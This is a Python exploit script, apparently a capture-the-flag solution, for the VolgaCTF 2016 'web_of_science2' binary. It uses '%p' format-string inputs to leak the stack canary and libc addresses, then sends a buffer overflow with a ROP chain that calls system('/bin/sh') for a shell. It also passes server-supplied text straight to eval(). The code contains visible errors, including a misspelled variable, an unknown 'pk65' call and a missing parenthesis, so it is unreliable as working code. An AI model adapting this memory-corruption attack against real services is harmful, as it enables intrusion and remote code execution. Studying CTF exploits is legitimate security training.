from pxwn import *

exp = Exploit("web_of_science2",64)
gadget1 = exp.rop("prdi")
gadget2 = exp.rop("prsi")
gadget3 = exp.rop("ppr")
gadget4 = exp.rop("pppr")
gadget5 = exp.rop("ppppr")
gadget6 = exp.rop("/bin/sh")
gadget7 = exp.rop("leave")
shellcode = exp.normal(1) 

#================================================
#================================================
print "=" * 30
if gadget1 != "Gadgets Not Found!":
    print "pop rdi:" + hex(gadget1)
else:
    print gadget1

"""
print "=" * 30


print "=" * 30

if gadget2 != "Gadgets Not Found!":
    for i in gadget2:
        print "pop rsi: " + hex(i.address)
        print "Gadget Name: " + i.simpleString()
else:
    print gadget2

print "=" * 30

if gadget3 != "Gadgets Not Found!":
    for i in gadget3:
        print "pop pop ret: " + hex(i.address)
        print "Gadget Name: " + i.simpleString()
else:
    print gadget3

print "=" * 30

print "=" * 30
if gadget4 != "Gadgets Not Found!":
    for i in gadget4:
            print "pop pop pop ret: " + hex(i.address)
        print "Gadget Name: " + i.simpleString()
else:
    print gadget4

print "=" * 30

print "=" * 30
if gadget5 != "Gadgets Not Found!":
    for i in gadget5:
        print "pop pop pop pop ret: " + hex(i.address)
        print "Gadget Name: " + i.simpleString()
else:
    print gadget5

print "=" * 30
"""

def viewpaperinfo(p,data):
    p.sendl(data)
    p.recvul(":")
    p.sendl("0")
    p.recvul("Abstract:")
    p.recvul("\t")
    leak = p.recvl()
    leak = leak.split(".")
    system = int(leak[1],16)-0x37a3a0
    binsh = int(leak[1],16)-0x243d05
    canary = int(leak[16],16)
    print green("Canary: "),hex(canary)
    print green("System: "),hex(system)
    print green("Binsh: "),hex(binsh)
    p.recvul("URL:")
    p.recvul("\t")
    p.recvl()

    return (canary,system,binsh)


def addcontent(p,data):
    if data == "1":
        p.sendl(data)
        p.recvul(":")
        p.sendl("Hello"*5)
        p.recvl()
    if data == "2":
        p.sendl(data)
        p.recvul(":")
        p.sendl("Hello"*5)
        p.recvl()
    if data == "3" or data == "4" or data == "5":
        p.sendl(data)
        p.recvul(":")
        p.sendl("%p."*20)
        p.recvl()
    if data == "6":
        p.sendl(data)
        p.recvul(":")
        p.sendl("1000")
        p.recvul(":")
        p.sendl("1")
    if data == "7":
        p.sendl(data)
        p.recvul("Abstract:")
        p.recvul("\t")
        leak = p.recvl()
        leak = leak.split(".")
        print leak
        p.recvul("Tags:")
        p.recvul("\t")
        leak2 = p.recvl()
        p.recvul("URL:")
        p.recvul("\t")
        leak3 = p.recvl()

def addsigseg(p,data):
    p.sendl(data)
    p.recvul(":")
    p.sendl("AAAAAAA."+"%s.")
    p.recvl()


def exploit(p,canary,system,binsh):
    addcontent(p,"1")
    addcontent(p,"2")
    addsigseg(p,"3")
    addsigseg(p,"4")
    addsigseg(p,"5")
    p.recvul(">")
    p.sendl("8")
    p.recvul(">")
    p.sendl("4")
    p.recvul(":")
    p.sendl("1")
    p.recvul(">")
    p.sendl("1")
    p.recvul(">")
    p.sendl("1")
    p.recvul(":")
    p.sendl("A"*72+pk65(cananry)+"B"*8+pk64(gadget1)+pk64(binsh)+pk64(system)


        
#=========================================================

local=True

if local:
    p = process("./web_of_science2")
    pause()
    p.debug()
else:
    HOST = "webofscience.2016.volgactf.ru"
    PORT = 45678
    p = connect(HOST,PORT)
    pause()
    p.debug()

#=========================================================

p.recvl()
p.sendl("Hello")
p.recvl()
p.recvl()
for i in range(10):
    buf = p.recvl()
    buf = buf.replace(" = ?","",1).strip("\n")
    buf = str(eval(buf))
    print "Answer: " + buf
    p.recvul(":")
    p.sendl(buf)
    p.recvl()


p.recvul(">")
p.sendl("1")
p.recvul(">")
addcontent(p,"1")
p.recvul(">")
addcontent(p,"2")
p.recvul(">")
addcontent(p,"3")
p.recvul(">")
addcontent(p,"4")
p.recvul(">")
addcontent(p,"5")
p.recvul(">")
addcontent(p,"7")
p.recvul(">")
p.sendl("8")
p.recvul(">")
p.sendl("3")

p.recvul(":")
p.recvl()
p.recvl()
p.recvul(">")

canary,system,binsh = viewpaperinfo(p,"4")

#fuckign exploit
p.recvul(">")
p.sendl("1")
p.recvul(">")
exploit(p,canary,system,binsh)

#this solution is janky 

